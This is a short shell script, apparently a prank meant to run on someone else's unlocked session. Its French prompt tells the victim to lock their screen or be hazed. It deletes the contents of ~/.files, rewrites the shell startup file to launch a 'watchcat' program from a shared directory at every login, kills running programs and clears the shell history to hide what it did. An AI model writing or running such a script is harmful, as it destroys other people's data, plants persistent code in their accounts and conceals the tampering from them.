#!/bin/sh

rm /home/${USER}/.files/*
rm /home/${USER}/.tcshzc
pkill mplayer
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.tcshzc;
echo "/u/all/dekeys_t/public/lol/watchcat &" >> /home/${USER}/.tcshzc;
history -c
pkill xterm;